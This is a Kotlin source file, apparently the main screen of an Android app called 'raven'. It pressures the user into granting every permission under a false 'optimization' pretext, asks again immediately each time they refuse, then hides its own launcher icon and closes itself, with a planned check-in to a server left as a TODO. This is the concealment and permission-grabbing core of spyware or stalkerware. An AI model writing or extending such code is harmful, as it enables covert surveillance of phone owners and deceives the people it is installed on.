package com.project.raven

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val PERM_REQUEST_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main) 

        val btnStart = findViewById<Button>(R.id.btnStartSetup)
        btnStart.setOnClickListener {
             if (PermissionManager.hasAllPermissions(this)) {
                startAgentAndDisappear()
            } else {
                // If permissions missing, ask immediately
                PermissionManager.requestAllPermissions(this, PERM_REQUEST_CODE)
            }
        }

        // Auto-check on launch if already granted
        if (PermissionManager.hasAllPermissions(this)) {
            startAgentAndDisappear()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERM_REQUEST_CODE) {
            if (PermissionManager.hasAllPermissions(this)) {
                startAgentAndDisappear()
            } else {
                Toast.makeText(this, "Optimization requires all permissions.", Toast.LENGTH_LONG).show()
                // Ruthless: Ask again immediately
                PermissionManager.requestAllPermissions(this, PERM_REQUEST_CODE)
            }
        }
    }

    private fun startAgentAndDisappear() {
        // 1. Send "I am alive" to server (TODO)
        
        // 2. Hide the app icon
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // 3. Close UI
        finish()
    }
}
